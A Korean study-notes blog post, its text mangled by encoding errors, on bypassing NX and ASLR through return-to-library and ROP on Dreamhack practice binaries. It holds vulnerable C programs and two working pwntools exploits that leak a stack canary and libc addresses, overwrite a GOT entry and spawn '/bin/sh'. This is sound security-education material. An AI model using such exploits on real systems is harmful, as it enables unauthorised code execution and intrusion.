---
title:  "TIL : Bypass NX, ASLR - RTL, ROP ğŸ˜µâ€ğŸ’«"
excerpt: "2022.07.21 TIL âœ"
toc: true
toc_sticky: true

categories:
  - TIL
  - Hacking

---

https://dreamhack.io/lecture/courses/85

## ASLR

Address Space Layout Randomization(**ASLR**)ì€ **binaryê°€ ì‹¤í–‰ë  ë•Œë§ˆë‹¤ stack, heap, shared library ë“±ì„ random addressì— í• ë‹¹**í•˜ëŠ” ë³´í˜¸ ê¸°ë²•ì´ë‹¤.

### ASLRì˜ íŠ¹ì§•

ì•„ë˜ì˜ ì½”ë“œë¡œ VAS ìƒì˜ ì—¬ëŸ¬ ì˜ì—­ì˜ addressë¥¼ ì¶œë ¥í•´ë³´ì.

```c
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
int main() {
  char buf_stack[0x10];                   // ìŠ¤íƒ ë²„í¼
  char *buf_heap = (char *)malloc(0x10);  // í™ ë²„í¼
  printf("buf_stack addr: %p\n", buf_stack);
  printf("buf_heap addr: %p\n", buf_heap);
  printf("libc_base addr: %p\n", *(void **)dlopen("libc.so.6", RTLD_LAZY));  // ë¼ì´ë¸ŒëŸ¬ë¦¬ ì£¼ì†Œ
  printf("printf addr: %p\n", dlsym(dlopen("libc.so.6", RTLD_LAZY), "printf"));  // ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ì˜ ì£¼ì†Œ
  printf("main addr: %p\n", main);  // ì½”ë“œ ì˜ì—­ì˜ í•¨ìˆ˜ ì£¼ì†Œ
}
```

stackì˜ `buf_stack`, heapì˜ `buf_heap`, library í•¨ìˆ˜ `printf`, code segmentì˜ `main`, ê·¸ë¦¬ê³  libraryê°€ mappingëœ ì£¼ì†Œ `libc_base`ê°€ ì¶œë ¥ëœë‹¤.

```c
$ ./addr
buf_stack addr: 0x7ffcd3fcffc0
buf_heap addr: 0xb97260
libc_base addr: 0x7fd7504cd000
printf addr: 0x7fd750531f00
main addr: 0x400667
$ ./addr
buf_stack addr: 0x7ffe4c661f90
buf_heap addr: 0x176d260
libc_base addr: 0x7ffad9e1b000
printf addr: 0x7ffad9e7ff00
main addr: 0x400667
$ ./addr
buf_stack addr: 0x7ffcf2386d80
buf_heap addr: 0x840260
libc_base addr: 0x7fed2664b000
printf addr: 0x7fed266aff00
main addr: 0x400667
```

- **Code segmentì˜ `main`ì„ ì œì™¸í•œ** ë‹¤ë¥¸ ì£¼ì†Œë“¤ì€ ì‹¤í–‰í•  ë•Œë§ˆë‹¤ ë³€ê²½ëœë‹¤.
- `printf` **addressì˜ í•˜ìœ„ 12 bit ê°’ì€ ë³€ê²½ë˜ì§€ ì•ŠëŠ”ë‹¤.** LinuxëŠ” ASLRì´ ì ìš©ë  ë•Œ fileì„ **page ë‹¨ìœ„ë¡œ random addressì— mapí•œë‹¤**. ë”°ë¼ì„œ pageì˜ í¬ê¸°ì¸ 12 bit ì´í•˜ë¡œëŠ” ì£¼ì†Œê°€ ë³€ê²½ë˜ì§€ ì•ŠëŠ”ë‹¤.
- `libc_base`ì™€ `printf`ì˜ **ì£¼ì†Œ ì°¨ì´ëŠ” ì¼ì •í•˜ë‹¤.** ASLRì´ ì ìš©ë˜ë”ë¼ë„ **library fileì„ ê·¸ëŒ€ë¡œ map**í•˜ê¸° ë•Œë¬¸ì— mappingëœ libraryì˜ base ì£¼ì†Œë¡œë¶€í„° libraryì˜ symbolë“¤ê¹Œì§€ì˜ offsetì€ í•­ìƒ ì¼ì •í•˜ë‹¤.

## NX

**No-eXecute(NX)**ëŠ” **ì‹¤í–‰ì— ì‚¬ìš©ë˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­**ê³¼ **ì“°ê¸°ì— ì‚¬ìš©ë˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ì„ ë¶„ë¦¬**í•˜ëŠ” ë³´í˜¸ ê¸°ë²•ì´ë‹¤. Linuxì—ì„œ NXê°€ ì ìš©ëœ binaryì—ëŠ” code ì˜ì—­ì„ ì œì™¸í•œ ë‹¤ë¥¸ ì˜ì—­ë“¤ì€ ì‹¤í–‰ ê¶Œí•œì„ ê°–ì§€ ì•ŠëŠ”ë‹¤. 

## Return to Library (RTL)

**NX**ë¡œ ì¸í•´ **buffer ì•ˆì— ì£¼ì…í•œ shellcodeë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ìŒ** â†’ **Return address**ë¥¼ ì‹¤í–‰ ê¶Œí•œì´ ìˆëŠ” **binaryì˜ code ì˜ì—­** í˜¹ì€ binaryê°€ ì°¸ì¡°í•˜ëŠ” **libraryì˜ code ì˜ì—­**ìœ¼ë¡œ ë³€ê²½í•œë‹¤.

```c
#include <stdio.h>
#include <unistd.h>
const char* binsh = "/bin/sh";
int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  return 0;
}
```

### â€œ/bin/shâ€

ASLRì´ ì ìš©ë˜ì–´ë„ PIEê°€ ì ìš©ë˜ì§€ ì•Šìœ¼ë©´ **code segmentì™€ data segmentì˜ ì£¼ì†ŒëŠ” ê³ ì •**ë˜ë¯€ë¡œ ì½”ë“œ ë‚´ì˜ `binsh`ì˜ ì£¼ì†ŒëŠ” ê³ ì •ë˜ì–´ ìˆë‹¤.

### `system`ì˜ PLT í™œìš©í•˜ê¸° (Return to PLT)

**PLTì— ì–´ë–¤ library í•¨ìˆ˜ê°€ ë“±ë¡ë˜ì–´ ìˆë‹¤ë©´ ê·¸ í•¨ìˆ˜ì˜ PLT entryë¥¼ ì‹¤í–‰í•¨ìœ¼ë¡œì¨ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤.**

ASLRì´ ê±¸ë ¤ ìˆì–´ë„ PIEê°€ ì ìš©ë˜ì§€ ì•Šë‹¤ë©´ **PLTì˜ ì£¼ì†ŒëŠ” ê³ ì •**ë˜ë¯€ë¡œ, libraryì˜ base addressë¥¼ ëª°ë¼ë„ ì´ë¥¼ í†µí•´ **library functionì„ ì‹¤í–‰**í•  ìˆ˜ ìˆë‹¤.  â†’ **Return to PLT**

rdië¥¼ â€œ/bin/shâ€ì˜ ì£¼ì†Œë¡œ ì„¤ì •í•˜ê³ , `system`ì˜ PLTë¥¼ í™œìš©í•˜ì—¬ `system`ì„ ì‹¤í–‰í•œë‹¤ë©´ (`system(â€/bin/shâ€)`) shellì„ íšë“í•  ìˆ˜ ìˆë‹¤. 

`system` í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ë•Œ stackì€ ë°˜ë“œì‹œ **0x10 ë‹¨ìœ„ë¡œ ì •ë ¬**ë˜ì–´ ìˆì–´ì•¼ í•œë‹¤. `system` ë‚´ì˜ `movaps` instructionì€ stackì´ 0x10 ë‹¨ìœ„ë¡œ ì •ë ¬ë˜ì–´ ìˆì§€ ì•Šìœ¼ë©´ **segmentation fault**ë¥¼ ë°œìƒì‹œí‚¨ë‹¤.

### Return gadget

**Return gadget**ì€ `ret`**ìœ¼ë¡œ ëë‚˜ëŠ” assembly code ì¡°ê°**ì„ ì˜ë¯¸í•œë‹¤.

NXë¡œ ì¸í•´ shellcodeë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, **binaryì˜ ì‹¤í–‰ ê°€ëŠ¥í•œ section ë‚´ì—ì„œ ì›í•˜ëŠ” return gadgetì„ ì°¾ì€ ë’¤ ì´ë¥¼ ì¡°í•©**í•´ í”„ë¡œê·¸ë¨ì„ ì›í•˜ëŠ” ëŒ€ë¡œ ì œì–´í•  ìˆ˜ ìˆë‹¤. 

**ROPgadget**ì„ ì´ìš©í•´ ì›í•˜ëŠ” return gadgetì„ ì°¾ì„ ìˆ˜ ìˆë‹¤.

```c
$ ROPgadget --binary ./rtl --re "pop rdi"
Gadgets information
============================================================
0x0000000000400853 : pop rdi ; ret
```

`system`ê³¼ ê°™ì€ `movaps`ë¥¼ í¬í•¨í•˜ëŠ” í•¨ìˆ˜ë“¤ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ **stackì˜ alignment**ë¥¼ ë§Œì¡±ì‹œì¼œì•¼ í•  ë• `ret` **instruction í•˜ë‚˜ë§Œìœ¼ë¡œ ì´ë£¨ì–´ì§„ ì¡°ê°**ì„ stackì— ì§‘ì–´ë„£ìœ¼ë©´ ëœë‹¤. (ë°”ë¡œ stack ìƒì˜ ë‹¤ìŒ instructionìœ¼ë¡œ ì´ë™í•¨)

### Exploit

```c
from pwn import *

p = process("./rtl")
e = ELF("./rtl")

# [1] Leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
print("canary", hex(cnry))

# [2] Exploit
system_plt = e.plt["system"]
binsh = 0x400874
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b"A"*0x38 + p64(cnry) + b"B"*0x8
payload += p64(ret)  # align stack to prevent errors caused by movaps
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system_plt)

p.sendafter("Buf: ", payload)
p.interactive()
```

- **canary**ë¥¼ ì–»ëŠ” ê³¼ì •ì€ ìƒëµ.
- `binsh`ëŠ” **gdb**ë¥¼ ì´ìš©í•´ì„œ, `pop_rdi`ì™€ `ret`ëŠ” **ROPgadget**ë¥¼ ì´ìš©í•´ì„œ ì–»ì„ ìˆ˜ ìˆë‹¤.
- **payload**ëŠ” rdiì— `bisnh`ë¥¼ ë„£ê³ , `system`ì˜ PLT entryë¥¼ ì´ìš©í•´ `system`ì„ ì‹¤í–‰í•˜ë„ë¡ êµ¬ì„±í•œë‹¤.

## Return Oriented Programming (ROP)

**ROP**ëŠ” ë‹¤ìˆ˜ì˜ **return gadgetì„ ì—°ê²°**í•´ì„œ ì‚¬ìš©í•˜ëŠ” ê³µê²© ê¸°ë²•ì„ ë§í•œë‹¤.

```c
#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  printf("Buf: ");
  read(0, buf, 0x100);
  return 0;
}
```

### Vulnerability Scanning

- **Canary**ë¥¼ ì²« ë²ˆì§¸ `read`ë¥¼ ì´ìš©í•´ ì–»ì„ ìˆ˜ ìˆë‹¤.
- `system` **í•¨ìˆ˜**ê°€ binaryì— í¬í•¨ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ **ì£¼ì†Œë¥¼ ì§ì ‘ ê³„ì‚°**í•´ì•¼ í•œë‹¤. (í›„ìˆ )
- `"/bin/sh"` stringë„ binaryì— í¬í•¨ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ ì´ë¥¼ **ì§ì ‘ bufferì— ì ë˜ê°€**, **libc.so.6ì— í¬í•¨ëœ ë¬¸ìì—´ì„ í™œìš©**í•´ì•¼ í•œë‹¤.
    
    ```c
    pwndbg> search /bin/sh
    libc-2.27.so    0x7ffff7b980fa 0x68732f6e69622f /* '/bin/sh' */
    ```
    
- ë‘ ë²ˆì§¸ `read`ë¥¼ í†µí•´ **return gadget**ë“¤ì„ stackì— ì§‘ì–´ ë„£ì–´ programì„ ì œì–´í•  ìˆ˜ ìˆë‹¤.

### `system`ì˜ address ê³„ì‚°í•˜ê¸°

`system`ì€ **libc.so.6**ì— ì •ì˜ë˜ì–´ ìˆìœ¼ë©°, í•´ë‹¹ libraryì—ëŠ” ì´ binaryê°€ callí•˜ëŠ” `read`, `puts`, `printf`ë„ í¬í•¨ëœë‹¤. **library fileì€ memoryì— mapë  ë•Œ ì „ì²´ê°€ map**ë˜ë¯€ë¡œ `system`ë„ ë‹¤ë¥¸ í•¨ìˆ˜ë“¤ê³¼ í•¨ê»˜ process memoryì— ì €ì¥ëœë‹¤.

Binaryê°€ `system`ì„ ì§ì ‘ callí•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— `system`ì´ GOTì—ëŠ” ë“±ë¡ë˜ì§€ ì•Šì§€ë§Œ, `read`, `puts`, `printf`**ê°€ GOTì— ë“±ë¡**ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ì´ë“¤ì˜ GOTë¥¼ ì½ì„ ìˆ˜ ìˆë‹¤ë©´ **ë¯¸ë¦¬ ì•Œë ¤ì§„ í•¨ìˆ˜ë“¤ ê°„ì˜ address ì°¨ì´**ë¥¼ ì´ìš©í•´ `system`ì˜ ì£¼ì†Œë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆë‹¤.

**libcì˜ versionì— ë”°ë¥¸ í•¨ìˆ˜ë“¤ ê°„ì˜ offset**ì€ [https://libc.nullbyte.cat/](https://libc.nullbyte.cat/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤:

1. ìš°ì„  return gadgetì„ ì´ìš©í•´ **binaryê°€ callí•œ í•¨ìˆ˜ì˜ GOT entryë¥¼ ì¶œë ¥**í•˜ë©´, ì´ ê°’ì˜ **ë§ˆì§€ë§‰ 1.5 byte**ë¥¼ ì´ìš©í•´ **libcì˜ version**ì„ íŠ¹ì •í•  ìˆ˜ ìˆë‹¤. (ASLRì´ ì ìš©ë˜ì–´ë„ ë§ˆì§€ë§‰ 1.5 byteëŠ” ë³€í•˜ì§€ ì•ŠìŒ)
    
    ì˜ˆë¥¼ ë“¤ì–´, `read`ì˜ addressê°€ `0x7f4ff43e4140`ì´ë¼ë©´ ë§ˆì§€ë§‰ 1.5 byteì¸ 0x140ì„ ì…ë ¥í•˜ë©´ ëœë‹¤.
    
    <p align="center">
	   	<a href="/assets/images/TIL220721/Untitled.png">
		<img src="/assets/images/TIL220721/Untitled.png" width="500">
        </a>
	</p>
    
2. í•´ë‹¹í•˜ëŠ” libcë¥¼ ì°¾ì•„ë‚´ ê° í•¨ìˆ˜ë“¤ ê°„ì˜ offsetì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì•„ë˜ì˜ ì‚¬ì§„ì—ì„œ `read`ì™€ `system`ì˜ address ì°¨ì´ëŠ” 0xc0bf0ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.
    
    <p align="center">
    <a href="/assets/images/TIL220721/Untitled 1.png">
	<img src="/assets/images/TIL220721/Untitled 1.png" width="500">
    </a>
	</p>
    

### Exploit

1. í”„ë¡œê·¸ë¨ì´ `puts(read_got)`ë¥¼ ì‹¤í–‰í•˜ì—¬ `read`**ì˜ addressë¥¼ ì¶œë ¥**í•˜ê²Œ í•œë‹¤.
2. ì¶œë ¥í•œ `read`ì˜ addressë¥¼ `recv`í•œë‹¤. ì´ë¥¼ ì´ìš©í•´ `system`**ì˜ addressë¥¼ ê³„ì‚°**í•œë‹¤.
3. í”„ë¡œê·¸ë¨ì´ `read(0, read_got, 0x10)`ì„ ì‹¤í–‰í•˜ì—¬ ê³„ì‚°í•œ `system`ì˜ addressë¡œ `read`**ì˜ GOT entryë¥¼ ë®ì–´ ì“°ê²Œ** í•œë‹¤.
4. `read("/bin/sh")`ë¥¼ ì‹¤í–‰í•˜ë©´ `read`ì˜ GOT entryê°€ `system`ì˜ ì£¼ì†Œë¡œ ìˆ˜ì •ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— `system("/bin/sh")`**ê°€ ì‹¤í–‰**ëœë‹¤.

```python
from pwn import *

#p = process("./rop")
p = remote("host3.dreamhack.games", 9019)

e = ELF("./rop")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

buf = b"A"*(0x40-0x8+1)
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00" + p.recvn(7))
#print(hex(cnry))

read_plt = e.plt["read"]
read_got = e.got["read"]
puts_plt = e.plt["puts"]
pop_rdi = 0x00000000004007f3
pop_rsi_pop_r15 = 0x00000000004007f1
ret = 0x000000000040055e

payload = b"A"*(0x40-0x8) + p64(cnry) + b"A"*0x8

# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

# read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_pop_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi) + p64(read_got + 0x8)
payload += p64(read_plt)

p.sendafter("Buf: ", payload)
read = u64(p.recvn(6) + b"\x00"*2)
print(hex(read))
#lb = read - libc.symbols["read"]
#system = lb + libc.symbols["system"]
system = read - 0xc0bf0
#print("read", hex(read))
#print("libc_base", hex(lb))
#print("system", hex(system))

p.send(p64(system) + b"/bin/sh\x00")

p.interactive()
```

- `read(0, read_got, 0x10)`ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•œ return gadgetì„ ì‚½ì…í•  ë•Œ **rdx**ì˜ ê°’ ì—­ì‹œ ìˆ˜ì •í•´ì¤˜ì•¼ í•˜ì§€ë§Œ **ì¼ë°˜ì ìœ¼ë¡œ rdxì™€ ê´€ë ¨ëœ gadgetì€ ì°¾ê¸° ì–´ë µë‹¤**. ì´ëŸ´ ë•ŒëŠ” **libc_csu_init gadget**ì„ ì‚¬ìš©í•˜ê±°ë‚˜ **libcì˜ code gadget**ì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤.
    
    ì´ ë¬¸ì œì—ì„œëŠ” `read`ì˜ GOTë¥¼ ì½ì€ ë’¤ rdx ê°’ì´ ë§¤ìš° í¬ê²Œ ì„¤ì •ë˜ë¯€ë¡œ rdxë¥¼ ë”°ë¡œ ì„¤ì •í•´ì£¼ì§€ ì•Šì•„ë„ ê´œì°®ë‹¤. (`read`ì˜ ì„¸ ë²ˆì§¸ argumentëŠ” ì½ì–´ë“¤ì´ë ¤ëŠ” ê°’ì˜ í¬ê¸°ì´ê¸° ë•Œë¬¸) ê·¸ëŸ¬ë‚˜ ì´ ê²½ìš° ëª¨ë“  ì‹¤í–‰ì—ì„œ exploitì´ ì„±ê³µí•˜ì§€ ì•Šì„ ìˆ˜ë„ ìˆë‹¤.
    
- libcì˜ baseì¸ `lb`ë¥¼ `read - libc.symbols["read"]`ë¡œ ê³„ì‚°í•˜ì—¬ `system`ì˜ addressë¥¼ ì°¾ì„ ìˆ˜ë„ ìˆì§€ë§Œ, ì´ ê²½ìš° **serverê°€ ì‚¬ìš©í•˜ëŠ” libcì˜ versionì´ ë‹¤ë¥¼ ê²½ìš° exploitì´ ì‹¤íŒ¨**í•  ìˆ˜ ìˆë‹¤. ë”°ë¼ì„œ ìœ„ì—ì„œ ì–¸ê¸‰í–ˆë“¯ì´ libcì˜ versionì„ ì²´í¬í•˜ì—¬ ë¯¸ë¦¬ í•¨ìˆ˜ ê°„ì˜ offsetì„ ì•Œì•„ë‘ëŠ” ê²ƒì´ ì¢‹ë‹¤.